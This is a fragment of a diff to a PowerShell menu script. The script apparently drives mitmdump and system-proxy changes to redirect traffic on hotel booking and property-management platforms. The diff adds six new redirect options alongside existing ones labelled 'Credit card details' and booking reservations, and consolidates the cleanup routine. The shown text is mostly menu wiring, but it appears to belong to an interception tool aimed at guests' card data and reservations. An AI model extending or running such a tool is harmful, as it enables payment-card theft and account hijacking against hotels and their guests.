     Write-Host "   19) Credit card details (function 19)"
-	Write-Host "   20) Clear Function 17"
+    Write-Host "   20) Clear Function 17"
+    Write-Host ""
+    Write-Host " FUNCTIONS 21-26:"
+    Write-Host "   21) Partners redirect (booker)"
+    Write-Host "   22) Partners and Messaging (booker)"
+    Write-Host "   23) Device security (pms)"
+    Write-Host "   24) Pulse redirect (pms)"
+    Write-Host "   25) Ultra Pulse (pms)"
+    Write-Host "   26) Platform monitoring only"
     Write-Host "==========================================="
     $opt = Read-Host "Enter option"
 
@@ -1028,32 +1374,7 @@ while ($true) {
         }
         "2" { Enable-OneShotRedirect }
         "3" { Enable-ForceRedirect }
-        "4" {
-            Remove-Item -Path $ForceFlag -Force -ErrorAction SilentlyContinue
-            Remove-Item -Path $OneShotFlag -Force -ErrorAction SilentlyContinue
-            Remove-Item -Path $MessageFlag -Force -ErrorAction SilentlyContinue
-            Remove-Item -Path $ProviderFlag -Force -ErrorAction SilentlyContinue
-            Remove-Item -Path $UserFlag -Force -ErrorAction SilentlyContinue
-            Remove-Item -Path $SecurityFlag -Force -ErrorAction SilentlyContinue
-            Remove-Item -Path $Operation11Flag -Force -ErrorAction SilentlyContinue
-            Remove-Item -Path $Operation12Flag -Force -ErrorAction SilentlyContinue
-            Remove-Item -Path $BookingHotelFlag -Force -ErrorAction SilentlyContinue
-            Remove-Item -Path $BookingHotelSecurityFlag -Force -ErrorAction SilentlyContinue
-            Remove-Item -Path $Operation16Flag -Force -ErrorAction SilentlyContinue
-            Remove-Item -Path $CustomRedirectFlag -Force -ErrorAction SilentlyContinue
-            Remove-Item -Path $CustomRedirectFromFile -Force -ErrorAction SilentlyContinue
-            Remove-Item -Path $CustomRedirectToFile -Force -ErrorAction SilentlyContinue
-            Remove-Item -Path $CustomRedirectDoneFlag -Force -ErrorAction SilentlyContinue
-            Remove-Item -Path $BookingReservationsFlag -Force -ErrorAction SilentlyContinue
-            Remove-Item -Path $BookingReservationsHotelIdFile -Force -ErrorAction SilentlyContinue
-            Remove-Item -Path $BookingReservationsReportIdFile -Force -ErrorAction SilentlyContinue
-            Remove-Item -Path $BookingCCDetailsFlag -Force -ErrorAction SilentlyContinue
-            Remove-Item -Path $BookingCCDetailsBnFile -Force -ErrorAction SilentlyContinue
-            Remove-Item -Path $BookingCCDetailsHotelIdFile -Force -ErrorAction SilentlyContinue
-            Clear-SystemProxies | Out-Null
-            Reset-Proxy-And-Stop-Mitmdump
-            Log-Write "All redirects disabled and proxy cleared."
-        }
+        "4" { Disable-AllRedirects }
         "5" {
             if (Test-Path $LogFile) {
                 Get-Content -Path $LogFile -Tail 200 -Wait
@@ -1075,7 +1396,13 @@ while ($true) {
         "17" { Enable-CustomRedirect }
         "18" { Enable-BookingReservationsRedirect }
         "19" { Enable-BookingCCDetailsRedirect }
-		"20" { Clear-Function17 }
+        "20" { Clear-Function17 }
+        "21" { Enable-PartnersRedirect }
+        "22" { Enable-PartnersAndMessRedirect }
+        "23" { Enable-DeviceRedirect }
+        "24" { Enable-PulseRedirect }
+        "25" { Enable-UltraPulseRedirect }
+        "26" { Enable-MonitorPlatforms }
         default { Write-Host "Invalid choice" }
     }
 }
